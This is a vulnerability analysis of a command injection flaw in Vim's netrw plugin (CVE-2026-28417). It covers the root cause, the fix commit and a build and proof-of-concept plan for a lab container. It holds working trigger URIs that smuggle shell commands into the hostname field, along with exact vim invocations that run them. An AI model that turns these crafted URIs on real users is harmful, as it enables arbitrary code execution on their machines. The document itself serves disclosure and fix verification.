# Vulnerability Analysis: CVE-2026-28417

## CVE ID
CVE-2026-28417

## Root Cause

**Two-part OS command injection in Vim's netrw plugin (CWE-78).**

The vulnerability stems from two cooperating flaws in the `netrw.vim` plugin:

### Part 1: Insufficient Hostname Validation (`s:NetrwValidateHostname`)

**File:** `runtime/pack/dist/opt/netrw/autoload/netrw.vim`
**Function:** `s:NetrwValidateHostname()` at **line 2597–2601**

```vim
function s:NetrwValidateHostname(hostname)
    " RFC1123#section-2 mandates, a valid hostname starts with letters or digits
    " so reject everyhing else
    return a:hostname =~? '^[a-z0-9]'
endfunction
```

The regular expression `'^[a-z0-9]'` is **unanchored at the end** and only checks whether the hostname **starts with** an alphanumeric character. Any subsequent characters — including shell metacharacters (`;`, `$`, `` ` ``, `|`, `&`, `(`, `)`) — pass validation. A hostname like `x;touch /tmp/pwned;x` passes because it starts with `x`.

### Part 2: Unescaped Shell Command Construction (`s:MakeSshCmd`)

**File:** `runtime/pack/dist/opt/netrw/autoload/netrw.vim`
**Function:** `s:MakeSshCmd()` at **line 8963–8977**

```vim
function s:MakeSshCmd(sshcmd)
    if s:user == ""
        let sshcmd = substitute(a:sshcmd,'\<HOSTNAME\>',s:machine,'')
    else
        let sshcmd = substitute(a:sshcmd,'\<HOSTNAME\>',s:user."@".s:machine,'')
    endif
    if exists("g:netrw_port") && g:netrw_port != ""
        let sshcmd= substitute(sshcmd,"USEPORT",g:netrw_sshport.' '.g:netrw_port,'')
    elseif exists("s:port") && s:port != ""
        let sshcmd= substitute(sshcmd,"USEPORT",g:netrw_sshport.' '.s:port,'')
    else
        let sshcmd= substitute(sshcmd,"USEPORT ",'','')
    endif
    return sshcmd
endfunction
```

The hostname (`s:machine`), username (`s:user`), and port (`s:port`, `g:netrw_port`) values are **substituted directly** into shell command template strings (e.g., `ssh USEPORT HOSTNAME ls -FLa`) **without any call to `shellescape()`**. Shell metacharacters in these values break out of the intended command and execute arbitrary commands.

## Vulnerable File(s) and Function(s)

| File | Function | Lines | Role |
|------|----------|-------|------|
| `runtime/pack/dist/opt/netrw/autoload/netrw.vim` | `s:NetrwValidateHostname()` | 2597–2601 | Insufficient hostname validation |
| `runtime/pack/dist/opt/netrw/autoload/netrw.vim` | `s:MakeSshCmd()` | 8963–8977 | Unescaped hostname/port substitution into shell commands |
| `runtime/pack/dist/opt/netrw/autoload/netrw.vim` | `s:NetrwMethod()` | 2379–2590 | URL parsing — extracts `g:netrw_machine` from URI |
| `runtime/pack/dist/opt/netrw/autoload/netrw.vim` | `s:RemotePathAnalysis()` | 9309–9326 | Directory browsing path — extracts `s:machine` from URI |
| `runtime/pack/dist/opt/netrw/autoload/netrw.vim` | `s:RemoteSystem()` | 9333–9350 | Calls `MakeSshCmd` and passes result to `system()` |
| `runtime/pack/dist/opt/netrw/autoload/netrw.vim` | `s:NetrwRemoteListing()` | 7863+ | Directory listing — calls `MakeSshCmd` at line 7958 |
| `runtime/pack/dist/opt/netrw/autoload/netrw/os.vim` | `netrw#os#Execute()` | 7–24 | Shell command execution via Vim's `:execute` |

## Triggering Input

### Primary Trigger (SCP protocol, directory browsing)
```
scp://x;touch /tmp/pwned;x/dir/
```

### Alternative Triggers
- **Semicolon injection:** `scp://a;id>/tmp/pwned;b/file.txt`
- **Command substitution:** `scp://a$(touch /tmp/pwned)/file.txt`
- **Backtick injection:** `` scp://a`touch /tmp/pwned`b/file.txt ``
- **Pipe injection:** `scp://a|touch /tmp/pwned|b/file.txt`
- **SFTP protocol:** `sftp://x;touch /tmp/pwned;x/dir/`
- **Rsync protocol:** `rsync://x;touch /tmp/pwned;x/dir/`

All of these pass validation (first char is alphanumeric) and the shell metacharacters are substituted unescaped into shell commands.

### How to Invoke

**Method 1 — Command-line argument (requires careful shell quoting):**
```bash
vim -c ':e scp://x;touch /tmp/pwned;x/dir/' -c ':q'
```

**Method 2 — From within Vim ex-command:**
```vim
:e scp://x;touch /tmp/pwned;x/dir/
```

**Method 3 — Vim command-line with escaped semicolons:**
```bash
vim 'scp://x;touch /tmp/pwned;x/file.txt'
```
Note: The single quotes prevent the user's shell from interpreting `;`. Vim/netrw receives the raw string.

**Important:** When using `-c`, the `:e` command is processed within Vim so shell metacharacters in the URL are not interpreted by the parent shell — they reach netrw intact.

## Attack Scenario

1. **Attacker crafts a malicious netrw URI** containing shell metacharacters in the hostname field, e.g., `scp://x;touch /tmp/pwned;x/dir/`

2. **User opens the URI in Vim.** This can happen via:
   - Clicking a link in a terminal emulator that opens Vim
   - Running `vim` with the URI as an argument
   - Opening the URI from Vim's command line with `:e`
   - A script or application calling Vim with the crafted URI
   - A `.vimrc` or modeline that opens a remote file

3. **Netrw parses the URI** via `s:NetrwMethod()`:
   - The SCP regex `'^scp://\([^/#:]\+\)\%([#:]\(\d\+\)\)\=/\(.*\)$'` extracts `x;touch /tmp/pwned;x` as the hostname
   - `g:netrw_machine` is set to `x;touch /tmp/pwned;x`

4. **Hostname validation passes** — `s:NetrwValidateHostname('x;touch /tmp/pwned;x')` returns true because `'^[a-z0-9]'` matches the leading `x`

5. **For directory URIs (trailing `/`)**, netrw calls `s:NetrwBrowse()` → `s:PerformListing()` → `s:NetrwRemoteListing()`:
   - `s:RemotePathAnalysis()` at line 7872 sets `s:machine` from the URL
   - `s:MakeSshCmd(g:netrw_list_cmd)` at line 7958 substitutes the raw hostname into the SSH command template: `ssh x;touch /tmp/pwned;x ls -FLa`

6. **The command is executed** via `exe "NetrwKeepj r! "...` at line 7960, which runs:
   ```
   ssh x;touch /tmp/pwned;x ls -FLa
   ```
   The shell interprets `;` as a command separator, executing:
   - `ssh x` (fails, but irrelevant)
   - `touch /tmp/pwned` (**arbitrary command — RCE**)
   - `x ls -FLa` (fails, but irrelevant)

7. **For file URIs (no trailing `/`)**, netrw calls `netrw#NetRead()` which also ends up executing scp/ssh commands with the unescaped hostname.

## Impact

- **Remote Code Execution (RCE):** Arbitrary shell commands execute with the privileges of the Vim process (typically the user's full shell privileges)
- **Confidentiality:** Attacker can read any file accessible to the user
- **Integrity:** Attacker can modify/create files, install backdoors
- **Availability:** Attacker can delete files, kill processes
- **Lateral movement:** If the user has SSH keys or sudo access, the attacker can leverage those

**CVSS 3.1:** 4.4 (Medium) — AV:L/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N
The score is moderate because user interaction is required (user must open the malicious URI).

## Authentication Requirements

**No authentication required.** This is a pre-auth vulnerability.

- The vulnerability is triggered by local user interaction (opening a URI in Vim)
- No credentials, API keys, or tokens are needed
- The attacker only needs to convince the user to open a crafted URI in Vim
- The netrw plugin is loaded automatically when Vim encounters a URI-style filename

## Fix Assessment

**The fix is complete and addresses both root causes with defense-in-depth.**

### Fix Details (commit `79348dbbc09332130f4c86045e1541d68514fcc1`):

**Layer 1 — Stricter hostname validation:**
```vim
function s:NetrwValidateHostname(hostname)
  let user_pat = '\%([a-zA-Z0-9._-]\+@\)\?'
  let host_pat = '[a-zA-Z0-9]\%([-a-zA-Z0-9.]{,62}[a-zA-Z0-9]\)\?$'
  let ipv4_pat = '\%(\d\{1,3}\.\)\{3\}\d\{1,3\}$'
  let ipv6_pat = '\[\?\%([a-fA-F0-9:]\{2,}\)\+\]\?$'
  return a:hostname =~? '^'.user_pat.host_pat ||
       \ a:hostname =~? '^'.user_pat.ipv4_pat ||
       \ a:hostname =~? '^'.user_pat.ipv6_pat
endfunction
```
The hostname pattern is now anchored (`$` end anchor) and restricts the character set to `[a-zA-Z0-9.-]` — **no shell metacharacters can appear**. Even though the `{,62}` quantifier has a Vim regex syntax issue (should be `\{,62}`), the pattern still effectively blocks metacharacters because:
- A single-char hostname matches via the optional group `\)?$`
- Multi-char hostnames require chars in `[-a-zA-Z0-9.]`
- The `$` end anchor prevents trailing metacharacters

**Layer 2 — Shell escaping in MakeSshCmd:**
```vim
function s:MakeSshCmd(sshcmd)
    let machine = shellescape(s:machine, 1)
    if s:user != ''
        let machine = shellescape(s:user, 1).'@'.machine
    endif
    let sshcmd = substitute(a:sshcmd,'\<HOSTNAME\>',machine,'')
    ...
    let sshcmd= substitute(sshcmd,"USEPORT",g:netrw_sshport.' '.shellescape(g:netrw_port,1),'')
    ...
    let sshcmd= substitute(sshcmd,"USEPORT",g:netrw_sshport.' '.shellescape(s:port,1),'')
```
All three values (hostname, username, port) are now wrapped in `shellescape(..., 1)` before substitution. Even if validation were bypassed, `shellescape()` wraps values in single quotes and escapes embedded single quotes, preventing shell interpretation.

### Minor Observation
The `host_pat` regex uses `{,62}` which in Vim regex should be `\{,62}`. This is a bug that makes the hostname validation overly restrictive for multi-character hostnames (it would reject some legitimate long hostnames). However, it does NOT create a security bypass because:
1. The character class `[-a-zA-Z0-9.]` still blocks all shell metacharacters
2. Short hostnames (1-2 chars) still match correctly
3. The `shellescape()` in `MakeSshCmd` provides a second defense layer

**The fix is complete.** Both the validation layer and the escaping layer must be defeated for exploitation, and the `shellescape()` layer alone is sufficient to prevent command injection.

## Potential Bypass Vectors

No viable bypass vectors identified. The defense-in-depth approach (validation + escaping) is robust:

1. **Alternative encodings:** Not applicable — Vim processes the URI string as-is, no URL decoding or Unicode normalization occurs before validation
2. **Null bytes:** Vim strings handle null bytes differently than C, and the regex would fail to match
3. **Different protocols:** The validation function is called for all netrw protocol methods that set `g:netrw_machine` (lines 1016, 1578, 1946, 6619)
4. **Race conditions:** Not applicable — single-threaded Vim execution
5. **`s:machine` vs `g:netrw_machine` divergence:** Both are derived from the same URL parsing; `MakeSshCmd` uses `s:machine` which is set by `RemotePathAnalysis` — the `shellescape()` in the fix covers this variable directly

## Related Attack Surface

### Same-file injection points that are NOT covered by `MakeSshCmd` but ARE covered by `netrw#os#Escape()`:

These lines concatenate `g:netrw_machine` into shell commands but pass the result through `netrw#os#Escape()` (which calls `shellescape()`). They were already partially protected even before the fix, but the weak validation was the gate:

| Line | Context | Protection |
|------|---------|------------|
| 1033 | SCP copy: `netrw#os#Escape(g:netrw_machine.":".path.v:val,1)` | `shellescape()` via `os#Escape()` |
| 1056 | FTP: `netrw#os#Escape(g:netrw_machine,1)` | `shellescape()` via `os#Escape()` |
| 1718 | SCP read: `netrw#os#Escape(g:netrw_machine.":".b:netrw_fname,1)` | `shellescape()` via `os#Escape()` |
| 2075 | SCP write: `netrw#os#Escape(g:netrw_machine.":".b:netrw_fname,1)` | `shellescape()` via `os#Escape()` |
| 1787 | rsync: `netrw#os#Escape(g:netrw_machine.g:netrw_rsync_sep.b:netrw_fname,1)` | `shellescape()` via `os#Escape()` |

### Lines with NO escaping (FTP interactive commands):

| Line | Code | Risk |
|------|------|------|
| 1075 | `put ='open '.g:netrw_machine.' '.g:netrw_port` | FTP protocol-level injection (NOT shell injection) |
| 1077 | `put ='open '.g:netrw_machine` | FTP protocol-level injection |
| 1665 | `put ='open '.g:netrw_machine.' '.g:netrw_port` | FTP protocol-level injection |
| 1667 | `put ='open '.g:netrw_machine` | FTP protocol-level injection |

These write to an FTP command script (not directly to shell), so they are FTP-level injection rather than OS command injection. The stricter validation in the fix addresses these by blocking metacharacters in the hostname.

### Other files
No other files in the Vim codebase use `g:netrw_machine` or `s:machine`. The vulnerability is fully contained within `runtime/pack/dist/opt/netrw/autoload/netrw.vim`.

## Build System

- **Type:** Autotools (configure + make)
- **Primary Language:** C (Vim core), VimL/Vimscript (netrw plugin)

### Build Commands
```bash
cd src/
./configure --with-features=normal --disable-gui --without-x --prefix=/usr/local
make -j$(nproc)
make install  # or use DESTDIR
```

### Dependencies
**Build-time:**
- `gcc` (C compiler)
- `make`
- `ncurses-dev` / `ncurses-devel` (terminal library)
- `libtool` (sometimes needed)

**For Wolfi/Alpine (apk):**
```bash
apk add --no-cache gcc make ncurses-dev libc-dev
```

**For Debian/Ubuntu (apt):**
```bash
apt-get install -y gcc make libncurses5-dev
```

### Runtime Requirements
- **No network services needed** — this is a client-side vulnerability triggered by URI input
- **No special configurations** — default Vim with netrw plugin enabled (netrw is bundled and loaded automatically)
- **The netrw plugin** is at `runtime/pack/dist/opt/netrw/autoload/netrw.vim` — it must be in Vim's runtime path
- **SSH/SCP client** should NOT be needed for the PoC — the command injection happens before SSH actually connects. The shell metacharacters break out of the SSH command and execute independently.

### Key Build Notes
- The vulnerability is in the **VimL script** (`netrw.vim`), not in the C source code
- The C compilation produces the Vim binary that loads and executes the netrw plugin
- Building from source at tag `v9.2.0072` ensures the vulnerable version of netrw is included
- The netrw plugin is in `runtime/pack/dist/opt/netrw/` — it may need to be explicitly loaded via `:packadd netrw` or it loads automatically when a URI is opened
- Use `--with-features=normal` (not `tiny` or `small`) to ensure the `packadd` and autoload features work

### Recommended Base Image
- **Debian 12 (bookworm-slim)** — stable, has all needed build tools easily available
- Alternatively: **Ubuntu 22.04** or **Alpine 3.18+**

### Lab Container PoC Strategy
1. Build Vim v9.2.0072 from source in the container
2. Run: `vim -c ':e scp://x;touch /tmp/pwned;x/dir/' -c ':q!'`
3. Verify: `test -f /tmp/pwned && echo "VULNERABLE" || echo "NOT VULNERABLE"`

The command injection occurs when netrw processes the directory listing request:
- netrw sees trailing `/` → treats as directory browse
- Calls `s:NetrwRemoteListing()` → `s:RemotePathAnalysis()` sets `s:machine = 'x;touch /tmp/pwned;x'`
- Calls `s:MakeSshCmd(g:netrw_list_cmd)` → substitutes hostname into `ssh USEPORT HOSTNAME ls -FLa`
- Result: `ssh  x;touch /tmp/pwned;x ls -FLa`
- Shell executes: `ssh x` (fails) then `touch /tmp/pwned` (RCE!) then `x ls -FLa` (fails)

### PoC Notes
- Vim may display errors from the failed SSH connection — this is expected
- The `-c ':q!'` ensures Vim exits after processing
- Use `-N` (nocompatible) and `-u NONE` if needed to avoid user vimrc interference, BUT ensure netrw is still loaded
- With `-u NONE`, netrw may not auto-load — use `-c 'packadd netrw'` before the `:e` command
- Better approach: use `--clean` flag which loads a minimal config but still enables packaged plugins
- Alternative: `vim --clean -c 'packadd netrw' -c ':e scp://x;touch /tmp/pwned;x/dir/' -c ':q!'`
